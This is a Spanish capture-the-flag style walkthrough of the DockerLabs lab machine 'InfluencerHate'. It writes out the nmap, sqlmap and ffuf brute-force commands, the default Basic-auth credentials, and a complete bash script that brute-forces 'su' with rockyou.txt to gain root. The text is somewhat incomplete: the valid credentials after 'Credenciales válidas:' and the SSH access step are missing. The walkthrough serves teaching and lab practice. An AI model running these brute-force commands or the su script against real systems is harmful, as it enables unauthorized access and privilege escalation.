## Introducción

Este documento presenta la resolución completa de la máquina **InfluencerHate**, desarrollada por *El Pingüino de Mario* para la plataforma **DockerLabs**, clasificada con una dificultad **Fácil**.
El laboratorio expone un servidor web protegido por autenticación básica HTTP que utiliza credenciales por defecto (`httpadmin:fhttpadmin`). Tras superar esta barrera, se identifica un formulario de login vulnerable a ataques de fuerza bruta, obteniendo las credenciales del usuario `admin:chocolate`. Tras el login, se revela un nuevo usuario (`balutin`) que permite el acceso SSH mediante fuerza bruta.
Una vez dentro, se realiza un ataque de fuerza bruta local contra `su` utilizando el diccionario `rockyou.txt`, obteniendo la contraseña de `root` y completando la escalada de privilegios.
Todo el proceso se llevó a cabo dentro de un entorno controlado con fines estrictamente educativos.

## Paso 0 — Despliegue y preparación

Se descomprime la máquina y se despliega utilizando el script proporcionado:

```bash
unzip InfluencerHate.zip
sudo bash auto_deploy.sh InfluencerHate.tar
```

Una vez iniciado el contenedor, se asigna la dirección IP correspondiente.

![IP asignada](https://res.cloudinary.com/dewqswzke/image/upload/v1762582724/Ip_qrhpof.png)

Se organiza el entorno de trabajo para mantener una estructura clara durante el análisis:

```bash
mkdir -p InfluencerHate/{content,exploits,nmap,scripts}
cd InfluencerHate
```

## Paso 1 — Reconocimiento

### 1.1 Escaneo de puertos

Se realiza un escaneo completo de puertos TCP para identificar servicios expuestos:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n 172.17.0.2 -oG allPorts
extractPorts allPorts
```

El resultado muestra los siguientes servicios accesibles externamente:

* **22/tcp** — SSH
* **80/tcp** — HTTP

## Paso 2 — Explotación (Acceso inicial)

### 2.1 SQL Injection

Se prueba SQL Injection sin éxito:

```bash
sqlmap -u "http://172.17.0.2/login.php" --forms --batch --dbs \
  --headers="Authorization: Basic aHR0cGFkbWluOmZodHRwYWRtaW4="
```

![SQLMap](https://res.cloudinary.com/dewqswzke/image/upload/v1763367276/SqlMap_pridcl.png)

### 2.2 Fuerza bruta en formulario web

Se realiza un ataque POST con FFUF:

```bash
ffuf -w /usr/share/wordlists/rockyou.txt:FUZZ \
     -u http://172.17.0.2/login.php \
     -X POST \
     -H "Authorization: Basic aHR0cGFkbWluOmZodHRwYWRtaW4=" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -d "username=admin&password=FUZZ" \
     -fw 802 -t 100
```

![FFUF](https://res.cloudinary.com/dewqswzke/image/upload/v1763367272/Ffuf_si7dt2.png)

Credenciales válidas:

## Paso 3 — Escalada de privilegios

### 3.1 De balutin → root

Se transfiere el diccionario `rockyou.txt` al sistema:

```bash
scp /usr/share/wordlists/rockyou.txt balutin@172.17.0.2:/
```

Se crea un script para fuerza bruta local contra `su`:

```bash
#!/bin/bash
echo "[*] Iniciando fuerza bruta contra 'su' con rockyou.txt"
echo "[*] Diccionario: rockyou.txt"
echo "[*] Esto puede tomar tiempo..."
echo ""

counter=0
while IFS= read -r password; do
    counter=$((counter + 1))

    if [ $((counter % 1000)) -eq 0 ]; then
        echo "[*] Intentos realizados: $counter"
    fi

    echo "$password" | timeout 2 su -c 'echo "SUCCESS"' 2>/dev/null | grep -q "SUCCESS"

    if [ $? -eq 0 ]; then
        echo ""
        echo "[+] ¡CONTRASEÑA DE ROOT ENCONTRADA!"
        echo "[+] Contraseña: $password"
        echo "[+] Intentos realizados: $counter"
        exit 0
    fi

done < rockyou.txt

echo "[-] Fuerza bruta completada. No se encontró la contraseña."
echo "[-] Total de intentos: $counter"
```

Se ejecuta el script:

![Script](https://res.cloudinary.com/dewqswzke/image/upload/v1763367276/Scritp_bwx5hz.png)

Se obtiene la contraseña de `root` y se accede:

```bash
su root
```

![Root](https://res.cloudinary.com/dewqswzke/image/upload/v1763367275/Root_zksizk.png)
